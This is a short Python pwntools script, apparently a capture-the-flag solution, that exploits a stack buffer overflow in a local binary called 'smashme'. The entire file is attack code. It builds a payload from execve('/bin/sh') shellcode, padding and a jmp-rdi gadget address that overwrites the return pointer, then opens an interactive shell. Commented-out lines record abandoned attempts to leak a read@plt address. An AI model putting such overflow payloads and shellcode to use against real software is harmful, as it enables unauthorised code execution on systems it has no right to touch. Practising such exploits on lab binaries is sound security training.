from pwn import *

r=process('./smashme')

#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

jmp_rdi=0x00000000004c4e1b

phrase='Smash me outside, how bout dAAAAAAAAAAA'

payload=shellcode+phrase+'A'*6+p64(jmp_rdi)



r.sendline(payload)

#not work here
#address_read_plt=int(r.recvline(keepends=False),16)

#receive the 4 byte from the process and print it out
#address_read_plt=unpack(r.recv(4)) 


#r.sendline('ls')
r.interactive()
